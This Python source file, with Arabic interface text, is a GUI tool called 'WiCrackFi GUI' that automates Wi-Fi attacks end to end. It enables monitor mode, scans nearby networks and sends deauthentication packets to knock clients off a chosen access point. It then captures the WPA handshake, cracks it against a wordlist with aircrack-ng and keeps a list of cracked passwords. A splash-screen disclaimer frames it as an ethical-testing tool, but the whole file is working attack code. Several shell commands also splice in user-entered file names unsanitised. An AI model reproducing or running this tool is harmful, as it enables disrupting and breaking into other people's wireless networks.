
# wifi_screen.py

import os
import csv
import time
import datetime
import shlex
import subprocess
import threading
import flet as ft

# تعريف الألوان العامة المتناسقة مع النمط المرجعي
PRIMARY_COLOR = "#4682B4"  # Steel Blue
SECONDARY_COLOR = "#87CEEB"  # Sky Blue
BG_COLOR = "#E6F3F3"
TEXT_COLOR = "#2F4F4F"
CARD_BG = "#FFFFFF"

# التأكد من وجود مجلد الإعدادات
if not os.path.exists('configs'):
    os.makedirs('configs')


# --- شريط التنقل السفلي المخصص ---
class WifiBottomAppBar(ft.BottomAppBar):
    def __init__(self, page: ft.Page):
        super().__init__()
        self.page = page
        self.height = 60
        self.bgcolor = SECONDARY_COLOR
        self.elevation = 4
        self.padding = ft.padding.only(left=0, right=0, bottom=0, top=8)

        self.content = ft.Container(
            height=55,
            bgcolor=ft.colors.WHITE,
            border_radius=ft.border_radius.only(top_left=20, top_right=20),
            content=ft.Row(
                alignment=ft.MainAxisAlignment.SPACE_EVENLY,
                vertical_alignment=ft.CrossAxisAlignment.CENTER,
                controls=[
                    self.__icon(ft.icons.HOME, "/Splash"),
                    self.__icon(ft.icons.SETTINGS_INPUT_ANTENNA, "/monitor"),
                    self.__icon(ft.icons.WIFI_FIND, "/scan"),
                    self.__icon(ft.icons.LOCK_OPEN, "/crack"),
                    self.__icon(ft.icons.VPN_KEY, "/passwords"),
                ]
            )
        )

    def __icon(self, name: str, route: str) -> ft.IconButton:
        is_selected = self.page.route == route
        return ft.IconButton(
            data={"route": route},
            icon=name,
            icon_color=PRIMARY_COLOR if is_selected else "#C1C1C1",
            icon_size=32,
            on_click=self.__clicked,
        )

    def __clicked(self, e: ft.ControlEvent) -> None:
        route = e.control.data["route"]
        if route:
            self.page.go(route)


# --- واجهة الترحيب الرئيسية ---
class WifiSplash(ft.View):
    def __init__(self):
        super().__init__()
        self.route = "/Splash"
        self.bgcolor = BG_COLOR
        self.padding = ft.padding.all(20)
        self.horizontal_alignment = ft.CrossAxisAlignment.CENTER
        self.vertical_alignment = ft.MainAxisAlignment.CENTER

        self.title = ft.Text(
            "WiCrackFi GUI",
            size=32,
            weight=ft.FontWeight.BOLD,
            color=PRIMARY_COLOR,
            text_align=ft.TextAlign.CENTER,
        )

        self.subtitle = ft.Text(
            "أداة اختبار أمان شبكات الواي فاي التلقائية",
            size=16,
            color=TEXT_COLOR,
            text_align=ft.TextAlign.CENTER,
        )

        # بطاقة المعلومات والإخلاء المرفقة بالأداة
        self.info_card = ft.Card(
            color=CARD_BG,
            elevation=3,
            content=ft.Container(
                padding=20,
                content=ft.Column(
                    [
                        ft.Text("تنبيه وإخلاء مسؤولية:", weight=ft.FontWeight.BOLD, color=ft.colors.RED_700),
                        ft.Text(
                            "تم تصميم هذه الأداة لأغراض اختبار الاختراق الأخلاقي والتعليم فقط. "
                            "يتطلب التشغيل الكامل بيئة Linux (مثل Kali) وصلاحيات المسؤول (Root) وبطاقة شبكة تدعم وضع المراقبة (Monitor Mode).",
                            size=13,
                            color=TEXT_COLOR,
                        ),
                    ],
                    spacing=10,
                )
            )
        )

        self.btn_start = ft.ElevatedButton(
            content=ft.Text("بدء الاستخدام", color=ft.colors.WHITE, size=16),
            width=280,
            height=50,
            style=ft.ButtonStyle(
                bgcolor=PRIMARY_COLOR,
                shape=ft.RoundedRectangleBorder(radius=12),
            ),
            on_click=lambda e: e.page.go("/monitor")
        )

        self.controls = [
            self.title,
            self.subtitle,
            ft.Divider(height=20, color="transparent"),
            self.info_card,
            ft.Divider(height=20, color="transparent"),
            self.btn_start,
        ]


# --- واجهة إعداد وضع المراقبة (Monitor Mode) ---
class MonitorModeView(ft.View):
    def __init__(self):
        super().__init__()
        self.route = "/monitor"
        self.bgcolor = BG_COLOR
        self.padding = ft.padding.all(15)

        self.header = ft.Container(
            content=ft.Row(
                [
                    ft.Text("إعداد وضع المراقبة", size=20, weight=ft.FontWeight.BOLD, color=PRIMARY_COLOR),
                ],
                alignment=ft.MainAxisAlignment.CENTER,
            ),
            bgcolor=SECONDARY_COLOR,
            padding=ft.padding.all(10),
            border_radius=10,
        )

        self.txt_interface = ft.TextField(
            label="اسم واجهة الشبكة",
            hint_text="مثال: wlan0",
            border_color=PRIMARY_COLOR,
            width=300,
        )

        self.btn_activate = ft.ElevatedButton(
            "تفعيل وضع المراقبة",
            icon=ft.icons.PLAY_ARROW,
            style=ft.ButtonStyle(bgcolor=PRIMARY_COLOR, color=ft.colors.WHITE),
            on_click=self.start_monitor
        )

        self.status_text = ft.Text("", color=TEXT_COLOR, text_align=ft.TextAlign.CENTER)
        self.progress_ring = ft.ProgressRing(visible=False, color=PRIMARY_COLOR)

        self.content = ft.Container(
            content=ft.Column(
                [
                    self.header,
                    ft.Divider(height=15, color="transparent"),
                    ft.Text("الرجاء إدخال اسم كرت الشبكة اللاسلكي لبدء تشغيله في وضع المراقبة:", text_align=ft.TextAlign.RIGHT),
                    self.txt_interface,
                    self.btn_activate,
                    self.progress_ring,
                    self.status_text,
                ],
                horizontal_alignment=ft.CrossAxisAlignment.CENTER,
                spacing=15,
            ),
            expand=True,
        )

        self.bottom_appbar = None  # سيتم تعيينه في الحاق الصفحة
        self.controls = [self.content]

    def start_monitor(self, e):
        interface = self.txt_interface.value.strip()
        if not interface:
            self.status_text.value = "الرجاء كتابة اسم واجهة الشبكة أولاً."
            self.page.update()
            return

        self.progress_ring.visible = True
        self.status_text.value = "يتم الآن تهيئة الشبكة وتفعيل وضع المراقبة..."
        self.page.update()

        def _run():
            try:
                # محاكاة لخطوات سطر الأوامر الأساسية للأداة الأصلية
                subprocess.run(["sudo", "service", "networking", "restart"], capture_output=True)
                subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True)
                subprocess.run(["sudo", "airmon-ng", "stop", interface + "mon"], capture_output=True)
                res = subprocess.run(["sudo", "airmon-ng", "start", interface], capture_output=True, text=True)

                # حفظ اسم الواجهة المخصصة
                with open("configs/NODELETE.txt", "w") as f:
                    f.write(interface + "mon")

                self.status_text.value = f"تم تفعيل وضع المراقبة بنجاح على الواجهة: {interface}mon"
            except Exception as ex:
                self.status_text.value = f"فشل الإعداد: تأكد من تشغيل الأداة بصلاحيات sudo وجودة الاتصال.\nتفاصيل: {str(ex)}"
            finally:
                self.progress_ring.visible = False
                self.page.update()

        threading.Thread(target=_run, daemon=True).start()


# --- واجهة مسح والتقاط شبكات الواي فاي (Scan Networks) ---
class ScanNetworksView(ft.View):
    def __init__(self):
        super().__init__()
        self.route = "/scan"
        self.bgcolor = BG_COLOR
        self.padding = ft.padding.all(15)

        self.header = ft.Container(
            content=ft.Row(
                [
                    ft.Text("مسح الشبكات المتاحة", size=20, weight=ft.FontWeight.BOLD, color=PRIMARY_COLOR),
                ],
                alignment=ft.MainAxisAlignment.CENTER,
            ),
            bgcolor=SECONDARY_COLOR,
            padding=ft.padding.all(10),
            border_radius=10,
        )

        self.btn_scan = ft.ElevatedButton(
            "بدء المسح (7 ثوانٍ)",
            icon=ft.icons.WIFI_TETHERING,
            style=ft.ButtonStyle(bgcolor=PRIMARY_COLOR, color=ft.colors.WHITE),
            on_click=self.start_scan
        )

        self.progress_bar = ft.ProgressBar(value=0, visible=False, color=PRIMARY_COLOR)
        self.status_text = ft.Text("", color=TEXT_COLOR)
        self.networks_list = ft.Column(scroll=ft.ScrollMode.AUTO, height=350, spacing=10)

        self.content = ft.Container(
            content=ft.Column(
                [
                    self.header,
                    ft.Divider(height=10, color="transparent"),
                    self.btn_scan,
                    self.progress_bar,
                    self.status_text,
                    ft.Divider(height=10, color=PRIMARY_COLOR),
                    ft.Text("الشبكات المكتشفة:", weight=ft.FontWeight.BOLD),
                    self.networks_list,
                ],
                horizontal_alignment=ft.CrossAxisAlignment.CENTER,
            ),
            expand=True,
        )

        self.controls = [self.content]

    def start_scan(self, e):
        self.progress_bar.visible = True
        self.networks_list.controls.clear()
        self.status_text.value = "جاري مسح الأثير للبحث عن شبكات..."
        self.page.update()

        def _run():
            try:
                # التحقق من وجود ملف الواجهة المجهزة
                if not os.path.exists("configs/NODELETE.txt"):
                    self.status_text.value = "لم يتم تحديد كرت الشبكة. الرجاء إعداد واجهة المراقبة أولاً."
                    self.progress_bar.visible = False
                    self.page.update()
                    return

                with open("configs/NODELETE.txt", "r") as f:
                    monitor_interface = f.read().strip()

                if os.path.exists('configs/WiFi__List-01.csv'):
                    subprocess.run(["rm", "-rf", "configs/WiFi__List-*"])

                # تشغيل أمر airodump-ng لمدة 7 ثوانٍ
                command = f"sudo airodump-ng -w configs/WiFi__List --output-format csv {monitor_interface}"
                process = subprocess.Popen(shlex.split(command), stdout=subprocess.PIPE, stderr=subprocess.PIPE)

                for i in range(7, 0, -1):
                    self.status_text.value = f"جاري جمع البيانات... الوقت المتبقي: {i} ثانية"
                    self.progress_bar.value = (7 - i) / 7
                    self.page.update()
                    time.sleep(1)

                process.terminate()
                process.wait()

                # تنظيف الملف وترتيب البيانات كما في الأداة الأصلية
                if os.path.exists("configs/WiFi__List-01.csv"):
                    subprocess.run("mv configs/WiFi__List-01.csv configs/WiFi__List-00.csv", shell=True)
                    subprocess.run(
                        "sed '/Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs/,$d' "
                        "configs/WiFi__List-00.csv > configs/WiFi__List-01.csv; sed -i '1d' configs/WiFi__List-01.csv",
                        shell=True
                    )
                    subprocess.run("rm -rf configs/WiFi__List-00.csv", shell=True)

                self.load_scanned_networks()
                self.status_text.value = "اكتمل المسح."
            except Exception as ex:
                self.status_text.value = f"حدث خطأ أثناء المسح: {str(ex)}"
            finally:
                self.progress_bar.visible = False
                self.page.update()

        threading.Thread(target=_run, daemon=True).start()

    def load_scanned_networks(self):
        csv_file = 'configs/WiFi__List-01.csv'
        if not os.path.exists(csv_file):
            self.networks_list.controls.append(ft.Text("لا توجد شبكات محفوظة حالياً."))
            return

        with open(csv_file, mode='r') as f:
            reader = csv.DictReader(f)
            index = 1
            for row in reader:
                try:
                    bssid = row['BSSID'].strip()
                    essid = row[' ESSID'].strip() if ' ESSID' in row else row.get('ESSID', '').strip()
                    channel = row[' channel'].strip() if ' channel' in row else row.get('Channel', '').strip()

                    card = ft.Card(
                        color=CARD_BG,
                        content=ft.Container(
                            padding=10,
                            content=ft.ListTile(
                                leading=ft.Icon(ft.icons.WIFI, color=PRIMARY_COLOR),
                                title=ft.Text(f"{index}. {essid if essid else '<مخفية>'}", weight=ft.FontWeight.BOLD),
                                subtitle=ft.Text(f"BSSID: {bssid} | CH: {channel}"),
                                trailing=ft.IconButton(
                                    icon=ft.icons.SENSORS,
                                    tooltip="التقاط المصافحة (Handshake)",
                                    icon_color=PRIMARY_COLOR,
                                    on_click=lambda e, b=bssid, c=channel, es=essid: self.navigate_to_handshake(b, c, es)
                                )
                            )
                        )
                    )
                    self.networks_list.controls.append(card)
                    index += 1
                except Exception:
                    continue

    def navigate_to_handshake(self, bssid, channel, essid):
        self.page.session.set("selected_bssid", bssid)
        self.page.session.set("selected_channel", channel)
        self.page.session.set("selected_essid", essid)
        self.page.go("/capture")


# --- واجهة التقاط المصافحة (Capture Handshake) ---
class CaptureHandshakeView(ft.View):
    def __init__(self):
        super().__init__()
        self.route = "/capture"
        self.bgcolor = BG_COLOR
        self.padding = ft.padding.all(15)

        self.bssid = ""
        self.channel = ""
        self.essid = ""

        self.header = ft.Container(
            content=ft.Row(
                [
                    ft.Text("التقاط مصافحة الشبكة", size=18, weight=ft.FontWeight.BOLD, color=PRIMARY_COLOR),
                ],
                alignment=ft.MainAxisAlignment.CENTER,
            ),
            bgcolor=SECONDARY_COLOR,
            padding=ft.padding.all(10),
            border_radius=10,
        )

        self.lbl_info = ft.Text("", size=14, weight=ft.FontWeight.BOLD)

        self.txt_filename = ft.TextField(
            label="اسم ملف المخرجات (CAP File)",
            value="handshake_capture",
            border_color=PRIMARY_COLOR,
            width=300,
        )

        self.txt_deauth = ft.TextField(
            label="عدد حزم إلغاء المصادقة (Deauth)",
            value="10",
            border_color=PRIMARY_COLOR,
            width=300,
        )

        self.btn_capture = ft.ElevatedButton(
            "بدء المراقبة والهجوم",
            icon=ft.icons.FLASH_ON,
            style=ft.ButtonStyle(bgcolor=PRIMARY_COLOR, color=ft.colors.WHITE),
            on_click=self.start_handshake_process
        )

        self.status_box = ft.Column(spacing=5, scroll=ft.ScrollMode.ALWAYS, height=150)
        self.progress_indicator = ft.ProgressRing(visible=False, color=PRIMARY_COLOR)

        self.content = ft.Container(
            content=ft.Column(
                [
                    self.header,
                    ft.Divider(height=10, color="transparent"),
                    self.lbl_info,
                    self.txt_filename,
                    self.txt_deauth,
                    self.btn_capture,
                    self.progress_indicator,
                    ft.Text("سجل أحداث التقاط المصافحة:", weight=ft.FontWeight.BOLD),
                    self.status_box,
                ],
                horizontal_alignment=ft.CrossAxisAlignment.CENTER,
            ),
            expand=True,
        )
        self.controls = [self.content]

    async def did_mount_async(self):
        self.bssid = self.page.session.get("selected_bssid") or ""
        self.channel = self.page.session.get("selected_channel") or ""
        self.essid = self.page.session.get("selected_essid") or ""
        self.lbl_info.value = f"الشبكة المستهدفة: {self.essid}\nBSSID: {self.bssid} | Channel: {self.channel}"
        await self.page.update_async()

    def start_handshake_process(self, e):
        filename = self.txt_filename.value.strip()
        deauth_count = self.txt_deauth.value.strip()

        if not filename or not deauth_count:
            self.status_box.controls.append(ft.Text("يرجى تعبئة الحقول الفارغة.", color=ft.colors.RED))
            self.page.update()
            return

        self.progress_indicator.visible = True
        self.status_box.controls.clear()
        self.status_box.controls.append(ft.Text("بدء تشغيل airodump-ng لمراقبة المصافحة..."))
        self.page.update()

        def _run_threads():
            try:
                with open("configs/NODELETE.txt", "r") as f:
                    monitor_interface = f.read().strip()

                if not os.path.exists('airodump_files'):
                    os.makedirs('airodump_files')

                timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H_%M_%S")
                dir_name = f"{filename}_{timestamp}"
                dir_path = f"airodump_files/{dir_name}"
                os.makedirs(dir_path)

                # أمر المراقبة وحفظ البيانات
                airodump_cmd = f"sudo airodump-ng -w {dir_path}/{filename} --bssid {self.bssid} -c {self.channel} --write-interval 1 {monitor_interface}"
                airodump_proc = subprocess.Popen(shlex.split(airodump_cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE)

                # إرسال هجوم قطع الاتصال (Deauthentication) لإجبار المستخدمين على إعادة المصادقة والتقاط المصافحة
                time.sleep(2)
                self.status_box.controls.append(ft.Text("إرسال حزم إلغاء المصادقة (Deauth) للعملاء المتصلين..."))
                self.page.update()

                deauth_cmd = f"sudo aireplay-ng --deauth {deauth_count} -a {self.bssid} {monitor_interface}"
                deauth_proc = subprocess.Popen(shlex.split(deauth_cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                deauth_proc.wait()

                # مراقبة وتحليل ملف الحزم الملتقطة للتحقق من وصول مصافحة الـ EAPOL (4WHS) كاملة عبر أداة tshark
                captured = False
                for attempt in range(1, 30):  # محاولة فحص الملف لمدة 30 ثانية
                    time.sleep(1)
                    tshark_cmd = f"tshark -r {dir_path}/{filename}-01.cap | grep 'Key (Message 4 of 4)' > {dir_path}/fourwhs.txt"
                    subprocess.run(tshark_cmd, shell=True, capture_output=True)

                    if os.path.exists(f"{dir_path}/fourwhs.txt"):
                        with open(f"{dir_path}/fourwhs.txt", "r") as fw:
                            lines = fw.readlines()
                        if len(lines) >= 1:
                            captured = True
                            break

                    self.status_box.controls.append(ft.Text(f"فحص حالة المصافحة... المحاولة {attempt}/30"))
                    self.page.update()

                # تنظيف وإنهاء العمليات الجارية
                airodump_proc.terminate()
                airodump_proc.wait()
                subprocess.run(f"rm -rf {dir_path}/fourwhs.txt", shell=True)

                if captured:
                    self.status_box.controls.append(ft.Text("تم التقاط المصافحة بنجاح!", color=ft.colors.GREEN, size=16, weight=ft.FontWeight.BOLD))
                    # حفظ تفاصيل الشبكة والمسار كشبكة جاهزة لفك التشفير
                    self.save_to_cracks(f"{dir_name}/{filename}-01.cap")
                else:
                    self.status_box.controls.append(ft.Text("لم يتم رصد المصافحة بعد. يمكنك المحاولة مرة أخرى أو زيادة عدد حزم deauth.", color=ft.colors.RED))

            except Exception as ex:
                self.status_box.controls.append(ft.Text(f"حدث خطأ غير متوقع: {str(ex)}", color=ft.colors.RED))
            finally:
                self.progress_indicator.visible = False
                self.page.update()

        threading.Thread(target=_run_threads, daemon=True).start()

    def save_to_cracks(self, filepath):
        file_name = "configs/cracks_list.csv"
        file_exists = os.path.exists(file_name)
        with open(file_name, mode='a', newline='') as f:
            writer = csv.writer(f)
            if not file_exists:
                writer.writerow(['DIR'])
            writer.writerow([filepath])


# --- واجهة كسر التشفير وإدارة ملفات التخمين (Crack WiFi & Wordlists) ---
class CrackMenuView(ft.View):
    def __init__(self):
        super().__init__()
        self.route = "/crack"
        self.bgcolor = BG_COLOR
        self.padding = ft.padding.all(15)

        self.header = ft.Container(
            content=ft.Row(
                [
                    ft.Text("فك التشفير والتخمين", size=20, weight=ft.FontWeight.BOLD, color=PRIMARY_COLOR),
                ],
                alignment=ft.MainAxisAlignment.CENTER,
            ),
            bgcolor=SECONDARY_COLOR,
            padding=ft.padding.all(10),
            border_radius=10,
        )

        self.dd_networks = ft.Dropdown(label="اختر ملف المصافحة", width=300)
        self.dd_wordlists = ft.Dropdown(label="اختر القاموس (Wordlist)", width=300)

        self.txt_custom_wordlist = ft.TextField(
            label="مسار قاموس مخصص",
            hint_text="مثال: /usr/share/wordlists/rockyou.txt",
            border_color=PRIMARY_COLOR,
            width=300,
        )

        self.btn_add_wordlist = ft.ElevatedButton(
            "إضافة القاموس المخصص",
            icon=ft.icons.ADD_TO_PHOTOS,
            on_click=self.add_custom_wordlist
        )

        self.btn_crack = ft.ElevatedButton(
            "بدء الهجوم (Aircrack-ng)",
            icon=ft.icons.SECURITY,
            style=ft.ButtonStyle(bgcolor=PRIMARY_COLOR, color=ft.colors.WHITE),
            on_click=self.start_cracking
        )

        self.progress_ring = ft.ProgressRing(visible=False, color=PRIMARY_COLOR)
        self.result_text = ft.Text("", color=TEXT_COLOR, size=15)

        self.content = ft.Container(
            content=ft.Column(
                [
                    self.header,
                    ft.Divider(height=10, color="transparent"),
                    self.dd_networks,
                    self.dd_wordlists,
                    ft.Divider(height=5, color="transparent"),
                    self.txt_custom_wordlist,
                    self.btn_add_wordlist,
                    ft.Divider(height=10, color=PRIMARY_COLOR),
                    self.btn_crack,
                    self.progress_ring,
                    self.result_text,
                ],
                horizontal_alignment=ft.CrossAxisAlignment.CENTER,
                scroll=ft.ScrollMode.ALWAYS,
            ),
            expand=True,
        )
        self.controls = [self.content]

    async def did_mount_async(self):
        self.load_handshakes()
        self.load_wordlists()
        await self.page.update_async()

    def load_handshakes(self):
        self.dd_networks.options.clear()
        file_path = "configs/cracks_list.csv"
        if os.path.exists(file_path):
            with open(file_path, mode='r') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    self.dd_networks.options.append(ft.dropdown.Option(row['DIR']))
        if not self.dd_networks.options:
            self.dd_networks.options.append(ft.dropdown.Option("لا يوجد ملفات مصافحة ملتقطة بعد."))

    def load_wordlists(self):
        self.dd_wordlists.options.clear()
        file_path = "configs/wordlist_list.csv"
        if not os.path.exists(file_path):
            with open(file_path, 'w') as f:
                writer = csv.writer(f)
                writer.writerow(['NAME'])
                writer.writerow(['/usr/share/wordlists/rockyou.txt'])

        with open(file_path, mode='r') as f:
            reader = csv.DictReader(f)
            for row in reader:
                self.dd_wordlists.options.append(ft.dropdown.Option(row['NAME']))

    def add_custom_wordlist(self, e):
        path = self.txt_custom_wordlist.value.strip()
        if not path:
            return
        file_path = "configs/wordlist_list.csv"
        with open(file_path, 'a') as f:
            writer = csv.writer(f)
            writer.writerow([path])
        self.txt_custom_wordlist.value = ""
        self.load_wordlists()
        self.page.update()

    def start_cracking(self, e):
        selected_cap = self.dd_networks.value
        selected_wl = self.dd_wordlists.value

        if not selected_cap or not selected_wl:
            self.result_text.value = "يرجى تحديد ملف المصافحة والقاموس أولاً."
            self.page.update()
            return

        self.progress_ring.visible = True
        self.result_text.value = "جاري تشغيل عملية التخمين فك التشفير..."
        self.page.update()

        def _run():
            try:
                # تشغيل أداة aircrack-ng ومحاكاة مخرجات التخمين
                out_path = "configs/passcrack.csv"
                command = f"sudo aircrack-ng airodump_files/{selected_cap} -w {selected_wl}"
                
                # تنفيذ الأمر وحفظ المخرجات بملف مؤقت
                with open(out_path, "w") as out_file:
                    subprocess.run(shlex.split(command), stdout=out_file, stderr=subprocess.PIPE)

                if os.path.exists(out_path):
                    with open(out_path, "r") as f:
                        lines = f.readlines()
                    
                    # قراءة المخرجات النهائية للتأكد من حالة الحصول على كلمة السر
                    count = len(lines)
                    posi = count - 1
                    
                    if posi > 0:
                        # استخراج كلمة المرور وتفاصيل الشبكة
                        subprocess.run(f"awk 'NR == {posi} {{print $4}}' configs/passcrack.csv > configs/passtemp.csv", shell=True)
                        subprocess.run(f"awk 'NR == 7 {{print $3}}' configs/passcrack.csv >> configs/passtemp.csv", shell=True)
                        subprocess.run(f"awk 'NR == 7 {{print $2}}' configs/passcrack.csv >> configs/passtemp.csv", shell=True)

                        with open("configs/passtemp.csv", "r") as tf:
                            temp_lines = [line.strip() for line in tf.readlines()]

                        if len(temp_lines) >= 3:
                            pssw = temp_lines[0]
                            essid = temp_lines[1]
                            bssid = temp_lines[2]
                            date_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")

                            # حفظ كلمات السر التي تم كسرها بنجاح
                            self.save_key(essid, bssid, pssw, date_str)
                            self.result_text.value = f"تم فك التشفير بنجاح!\nالشبكة: {essid}\nكلمة المرور: {pssw}"
                        else:
                            self.result_text.value = "لم يتم العثور على كلمة مرور مناسبة داخل القاموس."
                    else:
                        self.result_text.value = "فشل في العثور على كلمة المرور في القاموس المحدد."
                else:
                    self.result_text.value = "حدث خطأ أثناء فك التشفير."
            except Exception as ex:
                self.result_text.value = f"فشل الهجوم: {str(ex)}"
            finally:
                self.progress_ring.visible = False
                # إزالة الملفات المؤقتة
                if os.path.exists("configs/passcrack.csv"):
                    os.remove("configs/passcrack.csv")
                if os.path.exists("configs/passtemp.csv"):
                    os.remove("configs/passtemp.csv")
                self.page.update()

        threading.Thread(target=_run, daemon=True).start()

    def save_key(self, essid, bssid, password, date_str):
        file_path = "configs/passlist.csv"
        file_exists = os.path.exists(file_path)
        with open(file_path, 'a', newline='') as f:
            writer = csv.writer(f)
            if not file_exists:
                writer.writerow(['ESSID', 'BSSID', 'PASSWORD', 'DATE'])
            writer.writerow([essid, bssid, password, date_str])


# --- واجهة كلمات المرور المكتشفة (Cracked Passwords) ---
class PasswordsView(ft.View):
    def __init__(self):
        super().__init__()
        self.route = "/passwords"
        self.bgcolor = BG_COLOR
        self.padding = ft.padding.all(15)

        self.header = ft.Container(
            content=ft.Row(
                [
                    ft.Text("سجل كلمات المرور المخترقة", size=18, weight=ft.FontWeight.BOLD, color=PRIMARY_COLOR),
                ],
                alignment=ft.MainAxisAlignment.CENTER,
            ),
            bgcolor=SECONDARY_COLOR,
            padding=ft.padding.all(10),
            border_radius=10,
        )

        self.list_view = ft.ListView(expand=True, spacing=10)

        self.content = ft.Container(
            content=ft.Column(
                [
                    self.header,
                    ft.Divider(height=10, color="transparent"),
                    self.list_view,
                ]
            ),
            expand=True,
        )
        self.controls = [self.content]

    async def did_mount_async(self):
        self.load_passwords()
        await self.page.update_async()

    def load_passwords(self):
        self.list_view.controls.clear()
        file_path = "configs/passlist.csv"

        if not os.path.exists(file_path):
            self.list_view.controls.append(ft.Text("لا يوجد كلمات مرور مسجلة بعد.", text_align=ft.TextAlign.CENTER))
            return

        with open(file_path, mode='r') as f:
            reader = csv.DictReader(f)
            for row in reader:
                card = ft.Card(
                    color=CARD_BG,
                    content=ft.Container(
                        padding=15,
                        content=ft.Column(
                            [
                                ft.Row(
                                    [
                                        ft.Icon(ft.icons.VPN_KEY, color=PRIMARY_COLOR),
                                        ft.Text(f"الشبكة: {row['ESSID']}", weight=ft.FontWeight.BOLD, size=16),
                                    ],
                                    alignment=ft.MainAxisAlignment.START,
                                ),
                                ft.Text(f"BSSID: {row['BSSID']}", size=13, color=TEXT_COLOR),
                                ft.Text(f"كلمة المرور: {row['PASSWORD']}", size=15, color=PRIMARY_COLOR, weight=ft.FontWeight.BOLD),
                                ft.Text(f"التاريخ: {row['DATE']}", size=12, color=ft.colors.GREY_600),
                            ],
                            spacing=5,
                        )
                    )
                )
                self.list_view.controls.append(card)


